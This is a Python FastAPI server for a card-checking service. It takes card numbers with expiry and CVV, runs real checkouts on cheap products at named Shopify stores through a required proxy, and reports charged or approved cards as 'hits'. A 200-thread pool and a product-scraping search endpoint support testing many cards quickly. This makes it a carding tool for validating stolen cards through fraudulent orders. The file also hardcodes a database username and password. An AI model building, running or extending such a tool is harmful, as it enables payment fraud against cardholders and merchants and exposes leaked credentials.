"""
CardCheckout API — Server Entry Point
======================================
FastAPI server that exposes the Shopify card-checking engine as an HTTP API,
now with a global product search endpoint that doesn't require a store URL.

Endpoints
---------
GET  /health
    Returns service status and configuration.

GET  /search?keyword=...&limit=...&min=...&max=...&in_stock=...
    Search across thousands of Shopify stores without specifying a site.
    Automatically saves discovered sites to global_sites collection.

GET  /check?card=NUM|MM|YYYY|CVV&url=SHOP_URL&proxy=http://user:pass@host:port[&low=true]
    Check a card via query parameters.

POST /check  (JSON body)
    {
        "card":     "4111111111111111|12|2026|123",
        "shop_url": "https://example.myshopify.com",
        "proxy":    "http://user:pass@1.2.3.4:8080",
        "low":      true
    }
    Check a card via JSON body.

Response (both endpoints)
--------------------------
{
    "status":      "CHARGED | APPROVED | DECLINED | ERROR",
    "status_code": "ORDER_PLACED | INSUFFICIENT_FUNDS | CARD_DECLINED | ...",
    "amount":      "9.99",
    "error":       "human-readable error message or empty string",
    "retryable":   true | false,
    "receipt_url": "https://... or empty string"
}

Environment variables
---------------------
CHECKER_THREADS  — thread-pool size (default 200)
CHECKER_RETRIES  — auto-retry count on retryable errors (default 1)
PORT             — listen port (default 8000)

Notes
-----
- Proxy is REQUIRED for every checkout request (server has no built-in proxy).
- Supported proxy formats:
    http://user:pass@host:port
    http://host:port
    host:port:user:pass   (auto-converted)
"""

import os
import asyncio
import concurrent.futures
import functools
import logging
import time
import random
import re
from typing import Optional, Tuple
from datetime import datetime

from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

from checkout_engine import (
    run_checkout_for_card,
    normalize_proxy,
    parse_card_entry,
)

# ── NEW: async HTTP, caching, and MongoDB for global sites ──
import aiohttp
from cachetools import TTLCache
from pymongo import MongoClient

# ── MongoDB (same as bot) ──
MONGO_URL = "mongodb+srv://Hero:jasini12345@cluster0.9wykfhr.mongodb.net/?appName=Cluster0"
DB_NAME = "zero_check_bot"
mongo_client = MongoClient(MONGO_URL)
mongo_db = mongo_client[DB_NAME]
global_sites_collection = mongo_db["global_sites"]

# ── Logging ────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("cardcheckout.api")

# ── Configuration ──────────────────────────────────────────────────────
THREAD_WORKERS = int(os.environ.get("CHECKER_THREADS", "200"))
MAX_RETRIES    = int(os.environ.get("CHECKER_RETRIES", "1"))   # retry once by default

import threading as _threading

# Thread pool — runs blocking checkout in parallel without blocking the event loop
_pool = concurrent.futures.ThreadPoolExecutor(
    max_workers=THREAD_WORKERS,
    thread_name_prefix="chk",
)

# Active-checks counter (thread-safe)
_active_checks      = 0
_active_checks_lock = _threading.Lock()

def _inc_active():
    global _active_checks
    with _active_checks_lock:
        _active_checks += 1

def _dec_active():
    global _active_checks
    with _active_checks_lock:
        _active_checks -= 1

# ── Global store list (used as a seed; grows via global_sites) ──
SHOPIFY_STORES = [
    "shinybynature.com", "gymshark.com", "allbirds.com", "chubbies.com",
    "bombas.com", "mvmt.com", "princesspolly.com", "puravidabracelets.com",
    "deathwishcoffee.com", "uncommongoods.com", "mejuri.com", "glossier.com",
    "outerknown.com", "rothys.com", "everlane.com", "recess.com",
    "liquiddeath.com", "hismile.com", "herocosmetics.com", "nativecos.com",
    "drmtlgy.com", "goodr.com", "mandatory.com", "sakara.com",
    "brightland.co", "toastbrewing.com", "olipop.com", "malkorganics.com",
    "haloh.top", "bobabam.com", "blackriflecoffee.com", "beardbrand.com",
    "dollarbrushclub.com", "bentleyleather.com", "benchmadelife.com",
    "wilson.com", "penguin.com", "columbia.com", "spigen.com",
    "dbrand.com", "casetify.com", "popflexactive.com", "kellyandcompany.com",
    "minted.com", "society6.com", "redbubble.com", "threadless.com",
    "zazzle.com", "gelato.com", "printful.com"
]

# Cache for search results (TTL 5 minutes)
_search_cache = TTLCache(maxsize=500, ttl=300)

# ── FastAPI app ────────────────────────────────────────────────────────
app = FastAPI(
    title="CardCheckout API",
    version="2.0.0",
    description=(
        "Shopify card-check API + global product search. "
        "Search thousands of stores without a site, or run a full checkout."
    ),
    docs_url=None,
    redoc_url=None,
)

# ── Custom /docs UI ────────────────────────────────────────────────────
# (Keep your original _DOCS_HTML here – it's huge, so we omit it for brevity.
#  In production, paste the full HTML string from your original api_server.py)
_DOCS_HTML = """<html>...</html>"""  # REPLACE with your actual _DOCS_HTML


# ── Request / Response models ──────────────────────────────────────────

class CheckRequest(BaseModel):
    """POST /check request body."""
    card:     Optional[str]  = None
    shop_url: Optional[str]  = None
    proxy:    Optional[str]  = None
    low:      bool           = True

    model_config = {
        "json_schema_extra": {
            "example": {
                "card":     "4111111111111111|12|2026|123",
                "shop_url": "https://example.myshopify.com",
                "proxy":    "http://user:pass@1.2.3.4:8080",
                "low":      True,
            }
        }
    }


class CheckResponse(BaseModel):
    Response:    str  = "ERROR"
    CC:          str  = ""
    Price:       str  = ""
    Gate:        str  = "Shopify"
    Site:        str  = ""
    Charged:     str  = "False"
    status_code: str  = ""
    error:       str  = ""
    retryable:   bool = False
    receipt_url: str  = ""


# ── Helpers ────────────────────────────────────────────────────────────

def _validate_proxy(raw: str) -> Tuple[Optional[str], Optional[CheckResponse]]:
    if not raw or not raw.strip():
        return None, CheckResponse(
            Response="ERROR",
            status_code="PROXY_REQUIRED",
            error="proxy is required — e.g. http://user:pass@1.2.3.4:8080",
            retryable=False,
        )
    try:
        return normalize_proxy(raw), None
    except Exception as exc:
        return None, CheckResponse(
            Response="ERROR",
            status_code="PROXY_INVALID",
            error=f"Invalid proxy format: {exc}",
            retryable=False,
        )


def _validate_card(raw: str) -> Tuple[Optional[str], Optional[CheckResponse]]:
    import datetime as _dt
    if not raw or not raw.strip():
        return None, CheckResponse(
            Response="ERROR",
            status_code="CARD_REQUIRED",
            error="card is required — format: number|mm|yyyy|cvv",
            retryable=False,
        )
    try:
        _num, _month, _year, _cvv = parse_card_entry(raw)
    except Exception as exc:
        return None, CheckResponse(
            Response="ERROR",
            status_code="CARD_INVALID",
            error=f"invalid card format: {exc}",
            retryable=False,
        )
    now = _dt.datetime.utcnow()
    if _year < now.year or (_year == now.year and _month < now.month):
        return None, CheckResponse(
            Response="ERROR",
            status_code="CARD_EXPIRED",
            error=f"card expired: {_month:02d}/{_year}",
            retryable=False,
        )
    return raw.strip(), None


def _validate_url(raw: str) -> Tuple[Optional[str], Optional[CheckResponse]]:
    import urllib.parse as _up
    if not raw or not raw.strip():
        return None, CheckResponse(
            Response="ERROR",
            status_code="URL_REQUIRED",
            error="shop url is required — e.g. https://store.myshopify.com",
            retryable=False,
        )
    url = raw.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    try:
        parsed = _up.urlparse(url)
        hostname = parsed.hostname or ""
        if not hostname or "." not in hostname or " " in hostname:
            raise ValueError(hostname)
    except Exception:
        return None, CheckResponse(
            Response="ERROR",
            status_code="URL_INVALID",
            error=f"invalid shop url: {raw!r} — e.g. https://store.myshopify.com",
            retryable=False,
        )
    return url, None


def _build_response(res, shop_url: str = "") -> CheckResponse:
    status_name = res.status.name
    return CheckResponse(
        Response    = status_name,
        CC          = res.card or "",
        Price       = res.amount or "",
        Gate        = "Shopify",
        Site        = shop_url or res.shop_url or "",
        Charged     = "True" if status_name == "CHARGED" else "False",
        status_code = res.status_code or "",
        error       = str(res.error) if res.error else "",
        retryable   = res.retryable,
        receipt_url = res.receipt_url or "",
    )


async def _run_check(shop_url: str, card: str, proxy_url: str, low: bool) -> CheckResponse:
    loop     = asyncio.get_event_loop()
    attempts = 1 + MAX_RETRIES
    last: Optional[CheckResponse] = None

    for attempt in range(1, attempts + 1):
        t0 = time.perf_counter()
        _inc_active()
        try:
            fn  = functools.partial(run_checkout_for_card, shop_url, card, proxy_url, low)
            res = await loop.run_in_executor(_pool, fn)
        except Exception as exc:
            logger.warning("attempt %d/%d — unhandled exception: %s", attempt, attempts, exc)
            last = CheckResponse(Response="ERROR", error=str(exc), retryable=True)
            continue
        finally:
            _dec_active()

        resp = _build_response(res, shop_url)
        logger.info(
            "attempt %d/%d | status=%-8s code=%-24s elapsed=%.1fs",
            attempt, attempts, resp.Response, resp.status_code or "-", time.perf_counter() - t0,
        )
        if resp.Response in ("CHARGED", "APPROVED"):
            logger.info(
                "HIT | status=%s | amount=%s | site=%s | receipt=%s",
                resp.Response, resp.Price, shop_url, resp.receipt_url,
            )

        if not resp.retryable or attempt == attempts:
            return resp

        logger.info("retrying (retryable=true) …")
        last = resp

    return last  # type: ignore[return-value]


# ── NEW: Product fetching helpers ────────────────────────────────────

async def _fetch_store_products(session, store: str, keyword: str, min_price: float, max_price: float, in_stock: bool):
    results = []
    url = f"https://{store}/products.json?limit=250"
    try:
        async with session.get(url, timeout=8) as resp:
            if resp.status != 200:
                return []
            data = await resp.json()
            for product in data.get("products", []):
                title = product.get("title", "").lower()
                if keyword and keyword.lower() not in title:
                    continue
                for variant in product.get("variants", []):
                    try:
                        price = float(variant.get("price", 0))
                    except:
                        continue
                    if price < min_price or price > max_price:
                        continue
                    if in_stock and (not variant.get("available", False) or variant.get("inventory_quantity", 0) <= 0):
                        continue
                    results.append({
                        "site": store,
                        "product_id": str(product["id"]),
                        "variant_id": str(variant["id"]),
                        "title": product["title"],
                        "price": f"{price:.2f} USD",
                        "checkout": f"https://{store}/cart/{variant['id']}:1",
                        "in_stock": variant.get("available", False),
                        "inventory_quantity": variant.get("inventory_quantity", 0)
                    })
                    break
    except Exception:
        pass
    return results


def normalize_site_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url)
    url = url.rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url


# ── Routes ─────────────────────────────────────────────────────────────

@app.get("/docs", include_in_schema=False)
async def custom_docs():
    return HTMLResponse(_DOCS_HTML)


@app.get("/health", tags=["meta"])
async def health():
    with _active_checks_lock:
        active = _active_checks
    return {
        "ok":            True,
        "threads":       THREAD_WORKERS,
        "retries":       MAX_RETRIES,
        "active_checks": active,
    }


@app.get("/check", response_model=CheckResponse, tags=["check"])
async def check_get(
    card: str = Query(None, description="Card string: number|mm|yyyy|cvv"),
    cc: str = Query(None, description="Alias for card"),
    url: str = Query(None, description="Shopify store URL"),
    site: str = Query(None, description="Alias for url"),
    proxy: str = Query(..., description="Proxy: http://user:pass@host:port"),
    low: str = Query(default="true", description="true = prefer products under $5"),
):
    card_val = card or cc
    url_val = url or site
    if not card_val:
        return CheckResponse(Response="ERROR", status_code="CARD_REQUIRED", error="card or cc required")
    if not url_val:
        return CheckResponse(Response="ERROR", status_code="URL_REQUIRED", error="url or site required")

    card_ok, err = _validate_card(card_val)
    if err:
        err.CC = card_val
        return err
    url_ok, err = _validate_url(url_val)
    if err:
        err.CC = card_val
        err.Site = url_val
        return err
    proxy_ok, err = _validate_proxy(proxy)
    if err:
        err.CC = card_val
        err.Site = url_ok
        return err
    low_mode = low.strip().lower() in ("1", "true", "yes")
    resp = await _run_check(url_ok, card_ok, proxy_ok, low_mode)
    return resp


@app.post("/check", response_model=CheckResponse, tags=["check"])
async def check_post(req: CheckRequest):
    raw_card = req.card or ""
    raw_url  = req.shop_url or ""
    card_val, err = _validate_card(raw_card)
    if err:
        err.CC = raw_card
        return err
    url_val, err = _validate_url(raw_url)
    if err:
        err.CC   = raw_card
        err.Site = raw_url
        return err
    proxy_val, err = _validate_proxy(req.proxy or "")
    if err:
        err.CC   = raw_card
        err.Site = url_val
        return err
    resp = await _run_check(url_val, card_val, proxy_val, req.low)
    return resp


# ── Global search endpoint ──────────────────────────────────────────

@app.get("/search", tags=["search"])
async def global_search(
    keyword:   str  = Query(..., description="Product search term (e.g. 'socks')"),
    limit:     int  = Query(50, ge=1, le=500, description="Max results to return"),
    min_price: float = Query(0.0, ge=0, description="Minimum price in USD"),
    max_price: float = Query(1000.0, ge=0, description="Maximum price in USD"),
    in_stock:  bool = Query(True, description="Only return products with stock")
):
    cache_key = f"{keyword}:{limit}:{min_price}:{max_price}:{in_stock}"
    if cache_key in _search_cache:
        return _search_cache[cache_key]

    # Shuffle stores to distribute load
    random.shuffle(SHOPIFY_STORES)
    selected = SHOPIFY_STORES[:100]

    async with aiohttp.ClientSession() as session:
        tasks = [
            _fetch_store_products(session, store, keyword, min_price, max_price, in_stock)
            for store in selected
        ]
        results_lists = await asyncio.gather(*tasks, return_exceptions=True)

    flat = []
    for res in results_lists:
        if isinstance(res, list):
            flat.extend(res)

    flat.sort(key=lambda x: float(x["price"].split()[0]))
    flat = flat[:limit]

    # ── Auto-add discovered sites to global_sites ──
    if flat:
        unique_sites = set()
        for item in flat:
            site = item.get("site")
            if site:
                s = normalize_site_url(site)
                if s:
                    unique_sites.add(s)
        for site in unique_sites:
            try:
                global_sites_collection.update_one(
                    {"site": site},
                    {"$set": {"site": site, "last_seen": datetime.utcnow()}},
                    upsert=True
                )
                logger.info(f"Auto-added global site: {site}")
            except Exception as e:
                logger.warning(f"Failed to save global site {site}: {e}")

    response = {
        "query": keyword,
        "total_found": len(flat),
        "results": flat
    }
    _search_cache[cache_key] = response
    return response


# ── Standalone runner ──────────────────────────────────────────────────

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", "8000"))
    logger.info("CardCheckout API — port=%d threads=%d retries=%d", port, THREAD_WORKERS, MAX_RETRIES)
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")
